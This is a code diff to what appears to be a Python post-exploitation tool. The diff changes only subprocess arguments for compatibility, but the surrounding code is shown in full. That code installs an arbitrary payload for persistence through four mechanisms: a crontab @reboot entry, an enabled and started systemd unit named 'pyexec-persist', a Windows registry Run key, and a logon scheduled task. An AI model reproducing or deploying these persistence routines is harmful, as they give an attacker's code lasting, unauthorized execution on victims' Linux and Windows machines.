@@ -21,7 +21,7 @@ def _cron(payload):
     """crontab @reboot（当前用户）。"""
     try:
         cur = subprocess.check_output(
-            ["crontab", "-l"], text=True, stderr=subprocess.DEVNULL)
+            ["crontab", "-l"], universal_newlines=True, stderr=subprocess.DEVNULL)
     except Exception:
         cur = ""
     line = f"@reboot {payload}"
@@ -29,7 +29,7 @@ def _cron(payload):
         return "(cron already installed)"
     new = (cur.rstrip() + "\n" + line + "\n") if cur.strip() else line + "\n"
     try:
-        subprocess.run(["crontab", "-"], input=new, text=True, timeout=10)
+        subprocess.run(["crontab", "-"], input=new, universal_newlines=True, timeout=10)
         return f"(cron installed: {line})"
     except Exception as e:
         return f"(error: {e})"
@@ -50,9 +50,9 @@ def _systemd(payload):
         with open(path, "w", encoding="utf-8") as f:
             f.write(unit)
         subprocess.run(["systemctl", "enable", "pyexec-persist"],
-                       timeout=10, capture_output=True)
+                       timeout=10, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         subprocess.run(["systemctl", "start", "pyexec-persist"],
-                       timeout=10, capture_output=True)
+                       timeout=10, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         return f"(systemd unit installed: {path})"
     except Exception as e:
         return f"(error: {e})"
@@ -83,7 +83,7 @@ def _registry(payload):
     try:
         subprocess.run(["reg", "add", key, "/v", "pyexec",
                         "/d", payload, "/f"], timeout=10,
-                       capture_output=True)
+                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         return "(registry Run key installed: pyexec)"
     except Exception as e:
         return f"(error: {e})"
@@ -94,7 +94,7 @@ def _schtasks(payload):
     try:
         subprocess.run(["schtasks", "/create", "/tn", "pyexec",
                         "/tr", payload, "/sc", "onlogon", "/f"],
-                       timeout=10, capture_output=True)
+                       timeout=10, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         return "(schtasks installed: pyexec)"
     except Exception as e:
         return f"(error: {e})"
